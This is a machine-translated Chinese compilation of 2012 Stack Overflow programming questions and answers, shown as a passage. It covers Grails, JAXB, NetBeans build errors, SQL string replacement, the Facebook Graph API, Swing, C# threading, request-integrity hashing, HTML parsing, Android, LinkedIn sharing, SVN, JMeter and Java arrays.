我想我只是认为“在罗马时”的理念通常比单程港口更有效，尤其是在一开始。

* * *

**对更新的响应**：进程隔离会处理您的全局变量问题。至于性能和数据集大小，您只有尽可能多的内核/CPU 和内存。当您谈论该级别的规模问题时，您使用的是进程还是线程通常不是问题。您遇到的开销是[编组](http://en.wikipedia.org/wiki/Marshalling_(computer_science))过于昂贵。

证明编组是瓶颈，以及在多大程度上......您可以建立一个案例来说明为什么进程是线程上的问题。但是，可能会对现有代码进行一些小调整，以使编组更便宜，而无需重写。

# grails - 如何获取 grails 域类属性的默认值

> ID：10757206
> 
> 赞同：1
> 
> 时间：2012-05-25T15:28:56.823
> 
> 标签：grails, grails-orm, default-value

给定一个开始的域

```
class MyDomain {

    /* pre injuries board */
    Boolean isSomething = false 
```

有没有办法在不实例化对象的情况下获得默认值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-26T01:47:38.650

不，不是没有做这样的事情：

```
class MyDomain {
    public static final Boolean IS_SOMETHING_DEFAULT = false
    Boolean isSomething = IS_SOMETHING_DEFAULT

     ...
} 
```

之后...

```
Boolean myDomainDefault = MyDomain.IS_SOMETHING_DEFAULT 
```

# jaxb - 无法使用 JAXB 生成类

> ID：10757211
> 
> 赞同：0
> 
> 时间：2012-05-25T15:29:10.700
> 
> 标签：jaxb

我尝试使用 JAXB 生成类，但出现异常： IllegalArgumentException: Illegal Pattern character 'g' 我使用了一个复杂的 XSD 文件和一个绑定文件，如下所示。有人可以提供调查地点的线索吗？

```
<jxb:bindings version="1.0"
           xmlns:jxb="http://java.sun.com/xml/ns/jaxb"
           xmlns:xs="http://www.w3.org/2001/XMLSchema"
           xmlns:xjc="http://java.sun.com/xml/ns/jaxb/xjc"
           jxb:extensionBindingPrefixes="xjc">
        <jxb:bindings schemaLocation="IFX170_XSD.xsd" node="/xs:schema">
            <jxb:schemaBindings>
                <jxb:package name="cy.com.netinfo.netteller.ifx"/>
            </jxb:schemaBindings> 
        </jxb:bindings>
        <jxb:bindings schemaLocation="RemitDetail_Type.xsd" node="/xs:schema">
            <jxb:schemaBindings>
                <jxb:package name="cy.com.netinfo.netteller.ifx.remitdetailinfo"/>
            </jxb:schemaBindings> 
        </jxb:bindings>
        <jxb:bindings schemaLocation="$pain.001.001.01.xsd" node="/xs:schema">
            <jxb:schemaBindings>
                <jxb:package name="cy.com.netinfo.netteller.ifx.swift.pain_001_001_1"/>
            </jxb:schemaBindings> 
        </jxb:bindings>
        <jxb:bindings schemaLocation="$pain.002.001.01.xsd" node="/xs:schema">
            <jxb:schemaBindings>
                <jxb:package name="cy.com.netinfo.netteller.ifx.swift.pain_002_001_1"/>
            </jxb:schemaBindings> 
        </jxb:bindings>
        <jxb:bindings schemaLocation="$pain.004.001.01.xsd" node="/xs:schema">
            <jxb:schemaBindings>
                <jxb:package name="cy.com.netinfo.netteller.ifx.swift.pain_004_001_1"/>
            </jxb:schemaBindings> 
        </jxb:bindings> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-15T08:14:09.093

我终于找到了答案。问题是由于 com.sun.tools.xjc 包中的 Options 类有错误。在方法 getPrologComment 中，该类构建一个本地化消息，从本地化资源包获取参数 fot 日期和时间，然后使用固定的 Locale.ENGLISH 格式化日期。此行为在 JAXB 2.2.6 中。我解决了这个问题，只需更新 jar 文件 jaxb-xjc.jar 的包 com\sun\tools\xjc\ 中的文件 MessageBundle_it.properties（在我的情况下为意大利语）。我所做的更改是：Driver.DateFormat = aaaa.MM.gg (original) to Driver.DateFormat = yyyy/MM/dd (new) and Driver.TimeFormat = hh:mm:ss az (original) to Driver.TimeFormat = HH:mm:ss（新）通过这些更改，我能够根据需要生成类。HTH 弗拉维奥

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T11:10:52.020

我可能猜想您的其中一个 xsd 文件具有附加到类型/元素的基于正则表达式的限制。您是否验证了这些文件？

# java - java.lang.ClassFormatError：类文件“类名”中非本机或抽象方法中的缺失代码属性

> ID：10757216
> 
> 赞同：4
> 
> 时间：2012-05-25T15:29:33.253
> 
> 标签：java, netbeans-7

我知道这个问题可能看起来很愚蠢，因为我不能提供很多关于它的信息，但我认为问题必须是某种错误......

我用 NetBeans 7.1 编写了一个 java 程序，现在在尝试运行时出现此错误。10 分钟前它运行良好，我没有对错误所指的类进行任何更改

这可能是某种 NetBeans 错误吗？也许这是一个众所周知的问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-05-06T08:47:53.510

它在 NB 7.2 中也出现了这个异常

*   “清理构建”并重新启动 NB 不起作用
*   使用最新更新更新 NB 并执行“清理和构建”也不起作用。

所以我重命名了缓存目录：

```
c:\Users\userabcd\AppData\Local\NetBeans\Cache\7.2\index\ 
```

启动NB，等待它完成“后台扫描”并按下“调试项目”，瞧。缓存每隔一段时间就会损坏一次：-/

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-07T05:29:28.417

编辑：在下面添加了解决方案 B。

**解决方案 A**：

1.  项目属性
2.  构建 >> 编译
3.  *取消选中*：保存时编译
4.  清理和构建

**注释 A**：

*   如果您未选中保存时编译，则此项目将不再有此问题。
*   如果您喜欢 Compile on Save 功能的好处，您可以在清理和构建后**重新检查**该选项，并继续照常处理您的项目。
*   保存时编译旨在通过在保存对源代码的更改时在后台不断将 .java 文件重新编译为 .class 文件来节省时间。这样，当您构建或运行您的项目时，大部分编译工作已经完成，您可以快速运行和测试您的代码，即使对于大型项目也是如此。
*   NetBeans 使用一些花哨的缓存和版本控制来避免每次保存文件时都必须重新编译整个项目。这就是为什么这里列出的其他解决方案通常会起作用的原因；当它偶尔失败时，它们是击败这个缓存和版本控制系统的方法，就像上面一样。

**解决方案 B**：

1.  创建空文件夹，例如 C:\Temp\mine
2.  在 Target 中使用命令行参数为 NetBeans 创建一个新快捷方式： `"C:\Program Files\NetBeans 8.2\bin\netbeans64.exe" --userdir "C:\Temp\mine"`
3.  发生编译错误时（ClassNotFoundException、MethodNotFoundException 等...）删除`C:\Temp\mine\var\cache`

**注释 B**：

*   第一次您将丢失所有 NetBeans 设置。
*   更容易解决由缓存错误引起的未来编译错误。
*   允许运行多个 NetBeans 副本，每个用户目录一个。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T12:17:30.127

我也有这个例外。我的解决方案是：

*   编辑并保存提到的类（.java 文件）
*   清理和构建项目
*   部署到tomcat服务器

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-09-17T18:28:49.057

我刚刚在使用 Netbeans 7.4 Beta 时遇到了这种情况。

我尝试过的事情：

*   重新启动 Netbeans。
*   清洁和建造。
*   关闭 netbeans，重命名缓存目录，启动 netbeans 并等待扫描完成。

什么对我有用：

*   使源文件可写并保存无意义的更改（插入空格）。

我不知道为什么其他任何步骤都没有修复错误。如果我在重命名缓存目录后进行了清理和构建，也许它会起作用？

这是一个非常令人沮丧的情况-希望这可以帮助某人（也许是未来的我？）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-25T15:33:23.267

JDK 对 ClassFormatError 说：

> 当 Java 虚拟机尝试读取类文件并确定该文件格式错误或无法解释为类文件时抛出。

也许类文件已损坏。我将执行标准的 IT 支持声明。您是否尝试过重新启动 NetBeans？

希望有帮助

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-10T11:25:55.180

使用 Netbeans 7.1 做对了同样的事情。从事一个可以运行几个月的项目。现在我更改了一个使用 javax.persistence 持久化的 bean，现在抛出了这个异常。恢复我的一些更改，清理并编译项目，重新启动整个系统：仍然是异常。奇怪的是：生成的 .war 在另一台机器上的 Tomcat 中完美运行。

* * *

**更新**：

今天我又遇到了同样的问题，我不记得如何解决它，但我又找到了这个帖子。;)

半小时后，我找到了解决方案：只需更改属性的值`serialVersionUID`，重新部署应用程序，然后您可以将值更改为其原始值并再次重新部署-> 工作。似乎 Tomcat 将这个类保存在内部深处的某个地方——删除工作目录并没有导致成功。

# sql - 使用 SQL REPLACE 时有没有办法在字符串中指定位置？

> ID：10757217
> 
> 赞同：0
> 
> 时间：2012-05-25T15:29:33.720
> 
> 标签：sql, replace

我正在寻找类似的东西

```
UPDATE table 
SET field = REPLACE(field, "findstring", "replacestring"); 
```

带有位置修饰符。

我需要更换，例如：

从包含以下内容的字段中删除“,friday”：`wednesday,thursday,friday`

虽然不更改包含以下内容的字段：`thursday,friday,saturday`

而且，如果可能的话，在场地开始时针头的情况也是如此。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:33:43.813

你为什么不试试这个`SUBSTR`功能？

像`SUBSTRING_INDEX(field, ',friday', -1)`这样的东西在 MySQL 中有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:45:20.143

您无需替换即可执行此操作。. .

```
UPDATE table
SET field = (case when right(field, 7) = ',Friday'
                  then left(field, len(field) - 7)
                  else field
             end)

UPDATE table
SET field = (case when left(field, 7) = 'Friday,'
                  then right(field, len(field) - 7)
                  else field
             end) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:50:14.270

这将在 Microsoft SQL Server 中工作。

```
UPDATE table 
SET field = REPLACE(field, 'friday', 'replacestring')
WHERE RIGHT(field, 6) = 'friday' 
   OR LEFT(field, 6) = 'friday' 
```

# facebook - Facebook Graph API 和 Insights 不起作用

> ID：10757220
> 
> 赞同：1
> 
> 时间：2012-05-25T15:29:44.890
> 
> 标签：facebook, facebook-graph-api

我只是想利用 Facebook Graph API 为我的公司提取洞察数据。我正在使用[https://developers.facebook.com/tools/explorer](https://developers.facebook.com/tools/explorer)进行测试。

当我输入`https://graph.facebook.com/MY_ID/insights?`一个访问令牌时，我希望看到 JSON 数据，其中包含`Page_Views`. 但是我只看到这个：

```
{
      "data": [
      ],
      "paging": {
        "previous": "https://graph.facebook.com/MY_ID/insights?format=json&since=1337268417&until=1337527617",
        "next": "https://graph.facebook.com/MY_ID/insights?format=json&since=1337786817&until=1338046017"
      }
} 
```

关于 URL 的任何建议，或者我不应该使用 Graph API 来查看 Page_Views？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T15:55:12.693

从[Page object documentation](http://developers.facebook.com/docs/reference/api/page)，对于`insights`连接：

> **权限：**具有 read_insights 权限的有效 access_token，供有权查看主页见解的用户使用

在资源管理器中单击`Get Access Token`按钮，切换到“扩展权限”选项卡并选中“read_insights”框，然后单击按钮并重试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-17T23:43:23.683

对于可能遇到此问题并希望在 v2.4 中查看“页面”而不是用户的其他任何人，您可能需要在“获取令牌”字段中使用“获取页面令牌”，否则您可能会看到 ToddN锯

# java - 是否可以在 JTextfield 上抛出 KeyEvent virtualy？

> ID：10757227
> 
> 赞同：0
> 
> 时间：2012-05-25T15:30:41.113
> 
> 标签：java, swing, inputstream, jtextfield, keyevent

这是我的问题，我的 System.in 被重定向到 JTextField。现在用户可以按回车键，它将发送我的文本。但是我的客户将无法访问这个 JTextfield，所以我想知道是否可以在我的代码中重新创建 Enter 键。

```
 public static JTextField jtfEntree  = new JTextField();
   public static TexfFieldStreamer ts = new TexfFieldStreamer(jtfEntree); 
   System.setIn(ts); 
   jtfEntree.addActionListener(ts);

    //************************************************************************
    private void commandLaunch(String command)               
    //************************************************************************
    {
        jtfEntree.setText(command);
        //here is where i want to fire the key Enter
    }
    //************************************************************************

class TexfFieldStreamer extends InputStream implements ActionListener{

private JTextField tf;
private String str = null;
private int pos = 0;

public TexfFieldStreamer(JTextField jtf) {
    tf = jtf;
}

public int read() {
    //test if the available input has reached its end
    //and the EOS should be returned 
    if(str != null && pos == str.length()){
        str =null;
        //this is supposed to return -1 on "end of stream"
        //but I'm having a hard time locating the constant
        return java.io.StreamTokenizer.TT_EOF;
    }
    //no input available, block until more is available because that's
    //the behavior specified in the Javadocs
    while (str == null || pos >= str.length()) {
        try {
            //according to the docs read() should block until new input is available
            synchronized (this) {
                this.wait();
            }
        } catch (InterruptedException ex) {
            ex.printStackTrace();
        }
    }
    //read an additional character, return it and increment the index
    return str.charAt(pos++);
}

public void actionPerformed(ActionEvent arg0)
{
    // TODO Auto-generated method stub
    str = tf.getText() + "\n";
    pos = 0;
    synchronized (this) {
        //maybe this should only notify() as multiple threads may
        //be waiting for input and they would now race for input
    this.notify();
    }
}
} 
```

如果您需要更多信息，请在评论中提问！谢谢您的帮助

PS：我确实尝试将动作侦听器更改为文档侦听器，但它并不总是触发事件，因此它的行为不像我想要的那样。

尝试使用机器人，但似乎文本字段没有获得焦点，所以只是按下了键并且没有任何反应

```
//************************************************************************
protected static void commandExecute(String Command)     //COMMAND EXECUTE
//************************************************************************
{
    jtfEntree.setText(Command);
    jtfEntree.requestFocus();
    Robot robot;
    try {
        robot = new Robot();
        robot.keyPress(KeyEvent.VK_ENTER);
    } catch (AWTException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } 
    jtfEntree.setText("");
}
//************************************************************************ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:39:48.230

不知道这是否会有所帮助。但是你尝试过机器人课吗？

```
Robot robot = new Robot();
robot.keyPress(KeyEvent.VK_ENTER); 
```

将模拟 Enter 的按键。

这有帮助吗？

# c# - 一个类实例上的线程池，如何等待所有线程完成？

> ID：10757229
> 
> 赞同：2
> 
> 时间：2012-05-25T15:30:45.250
> 
> 标签：c#, threadpool

考虑下面的代码。我不想创建多个`class Waiter`. （所以我不能使用 ManualResetEvent 类）

```
using System;
using System.Threading;

    public class Waiter
    {
        static int counter=0;
        static int max=20;

        public void Start()
        {
            for (int i = 1; i <= max; i++)
            {
                ThreadPool.QueueUserWorkItem(DoWork, (object)i);

            }
            Console.Read();//without this line the application quits before all threads are complete :(

        }

        public void DoWork(object o)
        {
            try
            {
                Thread.Sleep(1000);

            }
            finally
            {
                counter++;
                Console.WriteLine(counter);
                if (counter==max )
                {
                    Console.WriteLine("All threads complete");
                }
            }

        }

    }

    public class ThreadPoolExample
    {
        static void Main()
        {

            Waiter wtr=new Waiter();
            wtr.Start();

        }
    } 
```

上面的代码有两个问题

1>如果 `Console.Read()`应用程序在所有线程结束之前退出。

2>语句 `Console.WriteLine("All threads complete");`执行两次。

我该如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:35:20.980

改用[任务](http://msdn.microsoft.com/en-us/library/dd537609.aspx)，然后你可以做[Task.WaitAll(tasks);](http://msdn.microsoft.com/en-us/library/dd270695.aspx)

此外，通过工厂实例化您的任务：

```
Task.Factory.StartNew(() => { Console.Writeline(""); }); 
```

它将为您使用线程池。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:00:44.173

您应该使用[Interlocked.Increment](http://msdn.microsoft.com/en-us/library/dd78zt0c.aspx)来增加`counter`。因为当两个线程试图同时增加它时存在竞争条件。

如果你想同时`Writer`工作多个实例，那么你不能有一个静态`counter`变量。他们会互相争斗。只需将其设为私有实例变量，就可以了。如果 Max 从不更改，则它应该是`const`或`readonly`（并保持静态），或者如果它可以更改，它也应该是一个实例字段。

最后，如果你有一个非静态`ManualResetEvent`实例，你可以在其中创建它`Start`，初始化它以设置，在循环结束时等待它，然后在最后一个线程完成时发出信号（你目前只是写到控制台）。

# java - 确保来自手机的请求不会被黑客重新发送的最佳实践（加密，MD5）

> ID：10757230
> 
> 赞同：1
> 
> 时间：2012-05-25T15:30:51.270
> 
> 标签：java, iphone, ios, ssl, md5

我有一个向服务器端发送请求的应用程序。我担心的是，黑客可以在对请求本身进行一些修改后窥探流量并重新发送请求。

我知道解决这个问题的最好方法是使用 SSL，但我认为这对于像我的应用程序这样的简单应用程序来说将是一个过度杀手，我正在考虑使用像 MD5 算法这样的简单方法。

这样，如果黑客试图修改请求并重新发送它，至少我会发现这一点。

我的问题是：

*   您认为这是一种好方法，还是您认为有更好的方法？
*   使用 Objective C 在 iOS 上生成的 MD5 是否与使用 Java 在 Linux 服务器中生成的值相同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:33:49.860

传统上，您需要从有效负载 + 时间戳 + 秘密令牌中生成哈希。由于只有客户端和服务器知道令牌，您应该能够正确验证哈希。并且不要忘记在传输中包含时间戳！您可能还想在发送之前加密整个内容 - 如果信息是敏感的（如密码等）。

我相信如果在不同的系统上制作 MD5 会匹配（如果正确完成）。

# mysql - mysql从字符串中获取整个单词所有包含字符的单词

> ID：10757232
> 
> 赞同：1
> 
> 时间：2012-05-25T15:30:54.010
> 
> 标签：mysql, string

我有一个带有字符串字段的表，我想提取第一个包含“-”的单词

如果该字段有“so I want to get th-is word”将返回“th-is”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:51:51.567

基本的答案是你应该依靠你的应用程序代码来解析这个响应，因为 Mysql 没有内置的字符串函数可以有效地处理这个问题。

另一种选择是创建你自己的 MySql 函数来处理这个问题——这个[链接](http://blog.fedecarg.com/2009/02/22/mysql-split-string-function/)可以作为你的教程。

否则，这是一个您想要的 select 语句 - 但是我认为我自己不会在生产中使用它。

```
SELECT 
    CONCAT( 
        SUBSTRING_INDEX( SUBSTRING_INDEX( "so I want to get th-is word", '-', 1 ), ' ', -1 ),
        '-',
        SUBSTRING_INDEX( SUBSTRING_INDEX( "so I want to get th-is word", '-', -1 ), ' ', 1 )
    ) AS returnstring; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:52:28.140

最简单的方法是将包含标点符号的单词包含在“反引号”中

“so I want to get `this-is` word”会生成“so I want to get th-is word”

# python - 使用 XPATH 处理格式错误的 HTML 文件

> ID：10757233
> 
> 赞同：2
> 
> 时间：2012-05-25T15:30:54.297
> 
> 标签：python, html, xml, xpath, elementtree

我继承了别人的（可怕的）代码库，目前正在拼命尝试修复问题。今天，这意味着在我们的模板/主页中收集所有死链接的列表。

我目前在 Python 中使用 ElementTree，尝试使用 xpath 解析站点。不幸的是，似乎 html 格式错误，并且 ElementTree 不断抛出错误。

是否有更多错误友好的 xpath 解析器？有没有办法在非严格模式下运行 ElementTree？是否有任何其他方法（例如预处理）可用于帮助此过程？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:35:44.900

[LXML](http://lxml.de)可以解析一些格式错误的 HTML，实现 ElementTree API 的扩展版本，并支持 XPath：

```
>>> from lxml import html
>>> t = html.fromstring("""<html><body>Hello! <p> Goodbye.</body></html""")
>>> html.tostring(t.xpath("//body")[0])
'<body>Hello! <p> Goodbye.</p></body>' 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T15:34:00.473

我的同情！

你最好用[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)解析你的 HTML 。正如主页所述：

> 你没有写那个糟糕的页面。你只是想从中获取一些数据。美丽的汤在这里为您提供帮助。自 2004 年以来，它一直在为程序员节省数小时或数天的快速周转屏幕抓取项目的工作。

更重要的是：

> Beautiful Soup 解析你给它的任何东西，并为你做树遍历的东西。您可以告诉它“查找所有链接”，或“查找类 externalLink 的所有链接”，或“查找所有 url 匹配“foo.com”的链接，或“查找带有粗体文本的表格标题，然后给出我那条短信。”

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-25T15:33:55.290

[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)可以很好地处理格式错误的 HTML。您还应该看看[如何修复错误嵌套/未闭合的 HTML 标记？](https://stackoverflow.com/questions/293482/how-do-i-fix-wrongly-nested-unclosed-html-tags). 在那里，还建议使用[Tidy](http://tidy.sourceforge.net/)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T15:57:53.223

这有点 OT，但由于它是您感兴趣的链接，您也可以使用外部链接检查器。

我已经使用[Xenu Link Sleuth](http://home.snafu.de/tilman/xenulink.html)多年了，效果很好。我有几个站点，它们有超过 15,000 个内部页面，并且在 LAN 上运行 Xenu，同时有 30 个线程，检查站点大约需要 5-8 分钟。检查所有链接类型（页面、图像、CSS、JS 等），并且有一个简单但有用的排除机制。它在 XP/7 上运行，具有 MSIE 的任何授权，因此您可以检查您网站的会员/非会员视图。

注意：登录到具有管理员权限的帐户时不要运行它，否则它会尽职尽责地在后台徘徊并开始*删除**您*的所有数据！（是的，我做过一次——幸运的是我有备份。:-)

# android - Android 图标/按钮，例如 Google+ 应用上的发送按钮

> ID：10757234
> 
> 赞同：0
> 
> 时间：2012-05-25T15:31:00.473
> 
> 标签：android, android-widget

我正在尝试使某些功能与 Google Plus 应用程序上的发送评论按钮完全相同。一切都很容易开始工作，但我无法弄清楚单击时让提交图标/按钮更改背景颜色的正确方法。处理它的最佳方法是什么？我想我可以在点击保持时做一些事情来手动更改颜色，但我不确定这是正确的方法。

这是我正在谈论的屏幕截图（下）。在右下角有一个小箭头发送图标。单击（或按住）时，图像的背景会更改以显示它已被单击。我想做同样的事情。

![应用程序](../Images/bd81e79a1efc01f14c4f5ff3f14c10e0.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:50:00.340

您可以使用 ImageButton：

在您的布局中，您创建 ImageButton，箭头图像作为 src，选择器作为背景。

```
 <ImageButton android:id="@+id/someID"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"   
        android:src="@drawable/the_arrow_image"
        android:background="@drawable/background_selector"/> 
```

选择器可能看起来像这样：

```
<?xml version="1.0" encoding="utf-8"?>

<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true" 
        android:drawable="@drawable/background_color_when_pressed" />
    <item android:drawable="@drawable/background_color_when_not_pressed" />
</selector> 
```

箭头图像必须是透明的，背景才能可见；）

# javascript - Linkedin 共享功能错误 - 弹出窗口自动调整大小

> ID：10757236
> 
> 赞同：1
> 
> 时间：2012-05-25T15:31:16.483
> 
> 标签：javascript, share, linkedin

当我去这里时：

[https://developer.linkedin.com/plugins/share-plugin-generator](https://developer.linkedin.com/plugins/share-plugin-generator)

提供一些 URL（即 google.com），然后单击按钮，新窗口弹出窗口以一些奇怪的行为打开 - 窗口自动更改它自己的大小：/

当您使用 JavaScript 手动打开弹出窗口时会发生同样的问题，LinkedIn 共享 URL：[https ://www.linkedin.com/cws/share?url=http%3A%2F%2Fgoogle.com](https://www.linkedin.com/cws/share?url=http%3A%2F%2Fgoogle.com)

问题出在 Chrome (Win7) 中，但 FF (Win7) 工作正常。有没有人可以重现？并且可以提出任何解决方案来解决这种行为吗？

* * *

编辑：LinkedIn 似乎已经解决了这个问题，因为它不能再重现了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-05-16T17:40:08.900

So, since LinkedIn has been acquired by Microsoft, the way sharing works has been entirely redone.

Your documentation link just goes to a blank page, it doesn't even 404 or error out. Anyway, here is the new documentation link: **[Official Microsoft LinkedIn Share API Documentation](https://docs.microsoft.com/en-us/linkedin/consumer/integrations/self-serve/plugins/share-plugin)**

All you should need to make this work is to use this as your URL:

```
https://www.linkedin.com/sharing/share-offsite/?url={url} 
```

Wouldn't it have been nice to have known that the URL and the API for sharing has changed entirely? If you are interested in a regularly maintained github project that keeps track of this so you don't have to, check it out! [Social Share URLs](https://github.com/bradvin/social-share-urls)

[![Social Share URLs Image](../Images/80f76ec3827227f0c745b62a5b15dff5.png)](https://i.stack.imgur.com/8rEut.jpg)

# svn - SVN 客户端和 API 的主要区别是什么？

> ID：10757241
> 
> 赞同：0
> 
> 时间：2012-05-25T15:31:24.213
> 
> 标签：svn, svn-api

我目前正在为我的团队设置一个小型持续集成服务器。我们最近将源代码切换到了 SVN 服务器。

例如，我想知道某些脚本中的 SVN 客户端或使用 Python 脚本中的 svn API 之间的主要区别是什么。除了我对一种或另一种语言的了解之外，我为什么要选择其中一种。

我仍然是这个项目的开始，所以我认为现在是提出这样一个问题的合适时机。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:29:27.720

**SVN客户端这个命令行工具**是开发者日常使用的。如果你只需要一些琐碎的事情，比如导出/结账/bump-version-and-commit，你可以用标准的 Unix 方式与它交互，提供命令行参数和解析输出。这是最简单的方法，如果出现问题，您可以通过手动重复操作来调试损坏的操作。我知道很少有程序可以做到这一点，而且它们似乎没有任何问题。

**SVN 客户端 API** (libsvnclient) 包含与命令行客户端提供的相同命令的编程接口，基本上是 1:1，但它对进程提供了更多的控制。如果您希望对文件列表/树进行操作，复杂的包含/排除规则，如果您希望自动解决某些文件的冲突，以及其他可能过于复杂而无法通过 bash 脚本或解析输出来完成的事情，那么这个 API 会有所帮助。学习和使用非常简单（简单到可以立即开始使用）。

**较低级别的 SVN API**（如存储库/工作副本访问 api）提供对 Subversion 流程各个方面的所有控制。如果您想使用存储库作为数据库后端，如果您需要对 repo/wc 进行危险的低级操作（例如编辑日志消息），那么就可以使用它。它既不简单也不好用，即使是基本的东西（事实上，来自 libsvnclient 的函数是这些 API 的快捷方式，只是为了让简单的事情变得简单）。我无法想象为什么 CI 系统需要它。

# jmeter - “java.net.UnknownHostException:abcd.efgh.co.uk”在远程服务器上测试 Web 应用程序时

> ID：10757243
> 
> 赞同：5
> 
> 时间：2012-05-25T15:31:28.860
> 
> 标签：jmeter

使用 Jmeter 测试在另一台远程服务器上运行的应用程序时出现以下异常。

```
java.net.UnknownHostException: abcd.efgh.co.uk
    at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:177)
    at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:366)
    at java.net.Socket.connect(Socket.java:529)
    at com.sun.net.ssl.internal.ssl.SSLSocketImpl.connect(SSLSocketImpl.java:559)
    at com.sun.net.ssl.internal.ssl.BaseSSLSocketImpl.connect(BaseSSLSocketImpl.java:141)
    at sun.net.NetworkClient.doConnect(NetworkClient.java:163)
    at sun.net.www.http.HttpClient.openServer(HttpClient.java:394)
    at sun.net.www.http.HttpClient.openServer(HttpClient.java:529)
    at sun.net.www.protocol.https.HttpsClient.<init>(HttpsClient.java:272)
    at sun.net.www.protocol.https.HttpsClient.New(HttpsClient.java:329)
at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.getNewHttpClient(AbstractDelegateHttpsURLConnection.java:172)
    at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:916)
    at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:158)
    at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:133)
    at org.apache.jmeter.protocol.http.sampler.HTTPJavaImpl.sample(HTTPJavaImpl.java:479)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerProxy.sample(HTTPSamplerProxy.java:62)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerBase.sample(HTTPSamplerBase.java:1054)
    at org.apache.jmeter.protocol.http.sampler.HTTPSamplerBase.sample(HTTPSamplerBase.java:1043)
    at org.apache.jmeter.threads.JMeterThread.process_sampler(JMeterThread.java:416)
    at org.apache.jmeter.threads.JMeterThread.run(JMeterThread.java:271)
    at java.lang.Thread.run(Thread.java:662) 
```

对于在 localhost 上运行的 Web 应用程序，相同的脚本正在成功运行。

我是否缺少测试远程服务器上运行的应用程序所需的任何配置。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-03T10:59:59.713

请参考以下屏幕截图在 Jmeter 中设置代理设置。![在此处输入图像描述](../Images/2d9b171884fd83997a0414c644fa7a15.png)

# java - Java：ArrayList^2 到 int[][]

> ID：10757249
> 
> 赞同：0
> 
> 时间：2012-05-25T15:31:41.410
> 
> 标签：java, arrays, multidimensional-array, for-loop

我有这个数组列表：

```
 ArrayList<ArrayList<Integer>> temporary = new ArrayList<ArrayList<Integer>>(); 
```

我需要如何将其转换为 int[][]

我有某种循环对吗？

```
 for(ArrayList<Integer> item: temporary) {
                    //Here??

                } 
```

干杯!

我被卡住了，因为数组不是动态的（或者你所说的）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:35:58.957

这应该有效：

```
final int N = temporary.size();
int[][] a = new int[N][];
for (int i = 0; i < N; ++i) {
    final ArrayList<Integer> item = temporary.get(i);
    final int M = item.size();
    a[i] = new int[M];
    for (int j = 0; j < M; ++j) {
        a[i][j] = item.get(j); // assumes no null elements!
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:51:09.763

如果您能够使用 Integer[][] （int 的对象包装器），您可以在单个循环中完成（有一个内部循环，但它对您隐藏）。

```
 ArrayList<ArrayList<Integer>> temporary = new ArrayList<ArrayList<Integer>>();              
    Integer[][] integers = new Integer[temporary.size()][];
    int i = 0;
    for(ArrayList<Integer> l : temporary)
    {
        integers[i++] = l.toArray(new Integer[l.size()]);           
    } 
```

# visual-studio-2012 - Visual Studio 11：服务器端包含在 ASP .NET 开发服务器中

> ID：10757251
> 
> 赞同：2
> 
> 时间：2012-05-25T15:31:54.367
> 
> 标签：visual-studio-2012, ssi, asp.net-development-serv

我正在[VS11 beta](http://www.microsoft.com/visualstudio/11/en-us)中测试一个静态网站项目，以检查其处理 HTML、CSS、JS 代码的能力以及用于实时操作页面的强大的内置浏览器（页面检查器）。[我在第 9 频道的视频](http://channel9.msdn.com/Shows/Web+Camps+TV/Web-Developer-Efficiency-Tools-in-Visual-Studio-11)中看到的所有这些奇迹。8-)

不幸的是，我的网站有用于页眉、页脚和常见部分的 SSI，VS 的页面检查器或任何浏览器在调试时都不会呈现。在我看来，必须为 SSI 配置 ASP .NET 开发服务器，我不知道如何配置，也无法在任何地方找到帮助。我知道更好的方法是使用服务器端脚本，但是同一个网站已经部署在运行 IIS 7.0 的托管服务器上，并且工作起来很吸引人。

有什么想法吗？

# charts - 如何在 RadChart 中显示每个图表系列的大纲？

> ID：10757253
> 
